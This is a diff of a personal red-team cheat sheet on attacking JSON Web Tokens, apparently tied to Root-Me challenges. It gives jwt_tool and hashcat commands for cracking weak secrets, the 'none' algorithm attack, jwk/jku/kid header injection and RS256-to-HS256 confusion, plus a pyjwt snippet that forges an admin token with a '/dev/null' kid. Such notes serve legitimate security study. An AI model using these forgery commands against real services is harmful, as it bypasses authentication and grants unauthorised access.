@@ -49,6 +49,8 @@ $ jwt_tool 'jwt' -I -pc claim -pv value
 
 You can also use [jwt.io](https://jwt.io/).
 
+<br>
+
 #### Secret Key Brute Forcing
 
 [![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
@@ -64,6 +66,8 @@ $ jwt_tool 'jwt' -C -d ./jwt.secrets.list # crack key
 $ hashcat -m 16500 hash ./jwt.secrets.list
 ```
 
+<br>
+
 #### JWT Header Injection — None Algorithm
 
 [![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
@@ -75,18 +79,20 @@ $ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
 ```
 
 📚 It also possible for the signature to not be checked at all by the server after issuing a JWT even if there is an algorithm.
-</div><div>
+
+<br>
 
 #### JWT Header Injection — JWK
 
 [![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
 
-JWT may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.
+An application may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.
 
 ```ps
 $ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
-                             # -hc kid -hv jwt_tool
+$ jwt_tool 'jwt' -T -X i -hc kid -hv jwt_tool     # with kid
 ```
+</div><div>
 
 #### JWT Header Injection — JKU
 
@@ -103,11 +109,14 @@ $ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
 
 📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight on URLs <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).
 
+<br>
+
 #### JWT Header Injection — KID
 
 [![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
 [![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
 [![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
+[![marabout](../../../../_badges/rootme/web_server/jwt_unsecure_file_signature.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
 
 The kid header may be present in two scenarios. The first one is to define which key file to use: `-p` must match the contents of `/dev/null`.
 
@@ -116,6 +125,10 @@ $ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
 ```
 
 The `kid` header may be used along with `jku`. The JSON file pointed by `jku` may contain multiple keys, and `kid` determines which one to use.
+
+➡️ Refer to [Path Traversal](/cybersecurity/red-team/s3.exploitation/vulns/web/path_traversal.md) if there is some filtering.
+
+<br>
 
 #### JWT Header Injection — RS256 to HS256
 
@@ -136,6 +149,49 @@ $ docker run -it ttervoort/jws2pubkey "JWT1" "JWT2"
 
 <hr class="sep-both">
 
+## Python JWT
+
+<div class="row row-cols-lg-2"><div>
+
+The [pyjwt](https://github.com/jpadilla/pyjwt) <small>(5.0k ⭐)</small> library can be used to manipulate JWT in Python. There are two unmaintained alternatives which are:
+
+* [python-jwt by GehirnInc](https://github.com/GehirnInc/python-jwt) <small>(0.1k ⭐, 2022 🪦)</small>
+* [python-jwt by D. Halls](https://github.com/davedoesdev/python-jwt) <small>(0.2k ⭐, 2023 🪦)</small> — has two CVEs
+
+```py
+headers = {
+    'kid': '/dev/null'
+}
+payload = {
+    'role': 'admin',
+    'iat': int(datetime.datetime.now(datetime.UTC).timestamp())
+}
+```
+</div><div>
+
+To install it:
+
+```shell!
+$ pip install pyjwt
+```
+
+To generate a JWT:
+
+```py
+import jwt
+token = jwt.encode(payload, '', algorithm='HS512', headers=headers)
+```
+
+To decode a JWT:
+
+```py
+import jwt
+payload = jwt.decode(token, '', algorithms=['HS512'])
+```
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
@@ -143,8 +199,6 @@ Stuff that I found, but never read/used yet.
 <div class="row row-cols-lg-2"><div>
 
 * [PortSwigger JWT](https://portswigger.net/web-security/jwt)
-* [JWT](https://jwt.io/), (Bearer, encrypted token), modern alternative to (apache) HTTP basic auth? (from=35). HTB/170. [RFC](https://tools.ietf.org/html/rfc7617).
-* [CVE-2022-39227](https://github.com/user0x1337/CVE-2022-39227) for `python-jwt<3.3.4`: given a token, forge fake tokens
 * [jwtcrack/jwt2john](https://github.com/Sjord/jwtcrack)
 </div><div>
 </div></div>
